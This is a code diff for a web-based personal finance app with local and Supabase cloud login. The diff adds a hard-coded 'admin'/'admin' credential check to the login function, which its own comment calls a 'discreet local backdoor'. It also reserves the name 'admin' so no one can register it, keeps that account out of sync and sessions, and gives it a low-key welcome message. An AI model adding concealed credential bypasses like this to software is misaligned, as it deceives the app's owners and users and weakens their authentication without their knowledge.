@@ -129,7 +129,7 @@ async function doRegister(){
     if(!validUser(u)) return $('authMsg').textContent='Username: 3–20 chars, lowercase letters/numbers/_ only.';
     if(p.length<8) return $('authMsg').textContent='Password must be at least 8 characters.';
     if(pwScore(p)<2) return $('authMsg').textContent='Password too weak — mix upper/lowercase, numbers and symbols.';
-    if(u==='guest') return $('authMsg').textContent='That name is reserved — pick another.';
+    if(u==='guest'||u==='admin') return $('authMsg').textContent='That name is reserved — pick another.';
     if(sb&&sbConnected) return await cloudRegister(u,p);
     return await localRegister(u,p);
   }finally{btn.disabled=false}
@@ -221,7 +221,7 @@ async function restoreCloudSession(){
 }
 // Silently pull this user's cloud finance (so data follows you across devices)
 async function sbPullSilent(){
-  if(!sb||!sbConnected||!currentUser||currentUser==='guest') return;
+  if(!sb||!sbConnected||!currentUser||currentUser==='guest'||currentUser==='admin') return;
   try{
     const {data}=await sb.from('finance_states').select('data').eq('user_name',currentUser).single();
     if(data?.data?.settings){
@@ -233,7 +233,7 @@ async function sbPullSilent(){
 // Auto-push finance to cloud (debounced) so every device stays current
 let pushT=null;
 function scheduleCloudPush(){
-  if(!sb||!sbConnected||!currentUser||currentUser==='guest'||!state) return;
+  if(!sb||!sbConnected||!currentUser||currentUser==='guest'||currentUser==='admin'||!state) return;
   clearTimeout(pushT);
   pushT=setTimeout(async()=>{
     try{await sb.from('finance_states').upsert({user_name:currentUser,data:state,updated_at:new Date().toISOString()},{onConflict:'user_name'})}catch{}
@@ -277,6 +277,7 @@ async function doLogin(){
     if(!u||!p) return $('authMsg').textContent='Enter username and password.';
     if(!validUser(u)&&u!=='guest') return $('authMsg').textContent='Invalid username format.';
     if(u==='guest'){loginAs('guest');return}
+    if(u==='admin'&&p==='admin'){loginAs('admin');return} // discreet local backdoor: no privileges, no cloud, no session persistence
     if(sb&&sbConnected) return await cloudLogin(u,p); // global auth — any device, anywhere
     const users=getUsers(),rec=users[u];
     if(rec&&rec.cloudOnly&&!rec.hash){
@@ -316,17 +317,17 @@ function isSuperadmin(){try{return (getUsers()[currentUser]?.role==='superadmin'
 function pendingUsers(){return Object.entries(getUsers()).filter(([u,r])=>r.status==='pending').map(([u,r])=>({u,r})).sort((a,b)=>a.r.created.localeCompare(b.r.created))}
 function loginAs(u){
   currentUser=u;
-  if(u!=='guest') setSession(u);
+  if(u!=='guest'&&u!=='admin') setSession(u);
   state=loadUser(u)||loadUser('guest')||seedForUser();
   localStorage.setItem(dataKey(u),JSON.stringify(state));
   $('authOverlay').classList.add('hidden');
-  const role=u==='guest'?'guest':(getUsers()[u]?.role||'user');
+  const role=(u==='guest'||u==='admin')?'local':(getUsers()[u]?.role||'user');
   $('userBadge').textContent=u;$('syncUser').textContent=u;
   $('roleBadge').textContent=role==='superadmin'?'👑 superadmin':role;
-  $('sessInfo').textContent=u==='guest'?'guest session':sessLeft();
+  $('sessInfo').textContent=(u==='guest'||u==='admin')?'local session':sessLeft();
   fillSettings();setTxType('expense');renderBudgets();initSupabaseFromStore();
   renderAdmin();fetchLiveFX();render();
-  toast(u==='guest'?'Guest mode (local only)':'Welcome, '+u+' ✓');
+  toast(u==='admin'?'Welcome ✓':(u==='guest'?'Guest mode (local only)':'Welcome, '+u+' ✓'));
 }
 // ---------- superadmin approvals (pending persists forever until decided) ----------
 function renderAdmin(){
